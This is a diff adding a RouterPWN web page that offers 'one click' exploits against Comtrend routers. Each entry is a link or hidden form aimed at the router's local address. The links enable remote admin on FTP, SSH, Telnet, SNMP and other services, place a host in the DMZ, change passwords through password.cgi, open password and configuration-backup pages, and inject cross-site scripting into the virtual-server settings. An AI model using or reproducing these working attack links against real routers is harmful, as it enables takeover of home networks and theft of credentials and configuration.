@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - Comtrend - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="comtrend">
+       <h1>
+        Comtrend
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form action="http://192.168.1.1/password.cgi" id="comtrendpass" method="post" name="comtrendpass">
+          <input name="sptPassword" type="hidden"/>
+          <input name="usrPassword" type="hidden"/>
+          <input name="sysPassword" type="hidden"/>
+         </form>
+         <tr>
+          <td>
+           01/08/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="javascript:alert('Busindre')">
+            [+]
+           </a>
+          </td>
+          <td>
+           <a href="javascript:comtrendip()">
+            CT-53XX CT-5071 CT-56XX Put a local IP in DMZ
+           </a>
+           <a href="javascript:ncomtrendipr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/08/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="javascript:alert('Busindre')">
+            [+]
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/scsrvcntr.cmd?action=save&amp;ftp=1&amp;ftp=3&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;ssh=1&amp;ssh=3&amp;telnet=1&amp;telnet=3&amp;tftp=1&amp;tftp=3">
+            CT-53XX CT-5071 CT-56XX Enable remote admin
+           </a>
+           <a href="javascript:setip('http://192.168.1.1/scsrvcntr.cmd?action=save&amp;ftp=1&amp;ftp=3&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;ssh=1&amp;ssh=3&amp;telnet=1&amp;telnet=3&amp;tftp=1&amp;tftp=3')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           11/09/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/18101/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:ncomtrendpass()">
+            CT-5624 Change passwords
+           </a>
+           <a href="javascript:ncomtrendpassr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/04/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/16275/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:comtrendpass()">
+            CT-5367 Change passwords
+           </a>
+           <a href="javascript:comtrendpassr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/04/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/16275/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/password.cgi">
+            CT-5367 CT-5624 Information Disclosure
+           </a>
+           <a href="javascript:setip('/password.cgi')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/23/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://foro.undersecurity.net/read.php?16,6320">
+            foro.undersecurity.net
+           </a>
+          </td>
+          <td>
+           <a href="javascript:urlxss('http://192.168.1.1/scvrtsrv.cmd?action=add&amp;srvName=URLXSS&amp;srvAddr=192.168.1.1&amp;proto=1,&amp;eStart=1,&amp;eEnd=1,&amp;iStart=1,&amp;iEnd=1');">
+            CT-507IT Cross site scripting
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/04/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/bugtraq/2008/Dec/226">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/password.html">
+            CT-536 HG-536+ Information Disclosure
+           </a>
+           <a href="javascript:setip('/password.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/04/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://archives.neohapsis.com/archives/bugtraq/2008-12/0227.html">
+            archives.neohapsis.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/backupsettings.html">
+            CT-536 HG-536+ Configuration Disclosure
+           </a>
+           <a href="javascript:setip('/backupsettings.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
